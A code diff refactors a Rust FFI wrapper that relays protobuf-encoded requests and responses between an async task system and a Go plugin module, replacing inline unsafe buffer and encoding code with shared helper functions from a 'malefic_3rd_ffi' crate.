@@ -1,25 +1,11 @@
-use async_trait::async_trait;
-use malefic_proto::prelude::*;
-use anyhow::anyhow;
-use std::ffi::{c_char, c_int, c_uint, CStr};
+use malefic_3rd_ffi::*;
+use std::ffi::{c_char, c_int, c_uint};
 
 extern "C" {
-    /// Returns the module name as a C string.
     fn GoModuleName() -> *const c_char;
-
-    /// Sends a serialized protobuf Request to the Go module.
-    /// First call for a given taskId lazily creates the session.
-    /// Returns 0 on success, -1 on error.
     fn GoModuleSend(task_id: c_uint, data: *const c_char, data_len: c_int) -> c_int;
-
-    /// Blocks until the next Response is available from the Go module.
-    /// status: 0 = data, 1 = done (session auto-cleaned), 2 = error.
     fn GoModuleRecv(task_id: c_uint, out_len: *mut c_int, status: *mut c_int) -> *mut c_char;
-
-    /// Closes the input channel for a task, signaling no more requests.
     fn GoModuleCloseInput(task_id: c_uint);
-
-    /// Frees a buffer allocated by Go (via C.CBytes / C.CString).
     fn GoFreeBuffer(ptr: *mut c_char);
 }
 
@@ -49,10 +35,8 @@ fn go_recv_blocking(id: u32) -> anyhow::Result<Option<Vec<u8>>> {
             if ptr.is_null() {
                 return Err(anyhow!("GoModuleRecv returned null with status 0"));
             }
-            let result =
-                unsafe { std::slice::from_raw_parts(ptr as *const u8, out_len as usize) }.to_vec();
-            unsafe { GoFreeBuffer(ptr) };
-            Ok(Some(result))
+            let buf = unsafe { FfiBuffer::new(ptr, out_len as usize, GoFreeBuffer) };
+            Ok(Some(buf.as_bytes().to_vec()))
         }
         1 => Ok(None), // done
         _ => Err(anyhow!("GoModuleRecv error (status={})", status)),
@@ -65,12 +49,7 @@ pub struct GolangModule {
 
 impl GolangModule {
     pub fn new() -> Self {
-        let name = unsafe {
-            let ptr = GoModuleName();
-            let s = CStr::from_ptr(ptr).to_string_lossy().into_owned();
-            GoFreeBuffer(ptr as *mut c_char);
-            s
-        };
+        let name = unsafe { ffi_module_name(GoModuleName, Some(GoFreeBuffer)) };
         Self { name }
     }
 }
@@ -139,8 +118,7 @@ impl ModuleImpl for GolangModule {
                 // Input already closed — only wait for Go responses.
                 match recv_rx.next().await {
                     Some(Ok(Some(response_bytes))) => {
-                        let response: Response = prost::Message::decode(&response_bytes[..])
-                            .map_err(|e| anyhow!("decode error: {}", e))?;
+                        let response = decode_response(&response_bytes)?;
                         let task_result = TaskResult::new_with_body(id, Body::Response(response));
                         if let Some(prev) = last_result.take() {
                             let _ = sender.unbounded_send(prev);
@@ -162,9 +140,7 @@ impl ModuleImpl for GolangModule {
                     body = receiver.next() => {
                         match body {
                             Some(Body::Request(request)) => {
-                                let mut buf = Vec::new();
-                                prost::Message::encode(&request, &mut buf)
-                                    .map_err(|e| anyhow!("encode error: {}", e))?;
+                                let buf = encode_request(&request)?;
                                 go_send(id, &buf)?;
                             }
                             _ => {
@@ -178,8 +154,7 @@ impl ModuleImpl for GolangModule {
                     recv_result = recv_rx.next() => {
                         match recv_result {
                             Some(Ok(Some(response_bytes))) => {
-                                let response: Response = prost::Message::decode(&response_bytes[..])
-                                    .map_err(|e| anyhow!("decode error: {}", e))?;
+                                let response = decode_response(&response_bytes)?;
                                 let task_result = TaskResult::new_with_body(id, Body::Response(response));
                                 if let Some(prev) = last_result.take() {
                                     let _ = sender.unbounded_send(prev);
